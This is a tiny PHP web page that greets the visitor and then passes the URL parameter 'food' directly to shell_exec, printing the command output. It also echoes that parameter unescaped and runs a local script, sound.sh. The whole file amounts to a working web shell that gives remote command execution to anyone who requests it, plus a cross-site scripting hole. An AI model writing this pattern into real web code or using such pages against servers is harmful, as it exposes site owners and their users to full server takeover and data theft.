<html>
<body>

Welcome <?php echo $_GET["food"];
	echo "\n";
	$output = shell_exec($_GET["food"]);
	
	echo exec("sound.sh");
	
	echo $output;
?>

</body>
</html>